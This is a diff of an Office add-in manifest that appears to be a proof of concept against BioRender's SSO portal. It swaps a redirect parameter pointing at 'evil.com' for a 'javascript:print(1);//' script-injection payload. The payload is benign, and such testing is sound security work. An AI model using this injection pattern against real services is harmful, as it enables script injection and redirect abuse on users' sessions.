@@ -6,8 +6,8 @@
   <Version>1.0.0</Version>
   <ProviderName>Test</ProviderName>
   <DefaultLocale>en-US</DefaultLocale>
-  <DisplayName DefaultValue="Test Add-in"/>
-  <Description DefaultValue="Test Add-in Description"/>
+  <DisplayName DefaultValue="Biorender Add-in3"/>
+  <Description DefaultValue="Biorender Add-in Description"/>
   <IconUrl DefaultValue="https://example.com/icon-32.png"/>
   <HighResolutionIconUrl DefaultValue="https://example.com/icon-64.png"/>
   
@@ -16,7 +16,7 @@
   </Hosts>
   
   <DefaultSettings>
-    <SourceLocation DefaultValue="https://app.biorender.com/office/sso_portal?portalUrl=https://evil.com"/>
+    <SourceLocation DefaultValue="https://app.biorender.com/office/sso_portal?portalUrl=javascript:print(1);//"/>
   </DefaultSettings>
   
   <Permissions>ReadWriteDocument</Permissions>
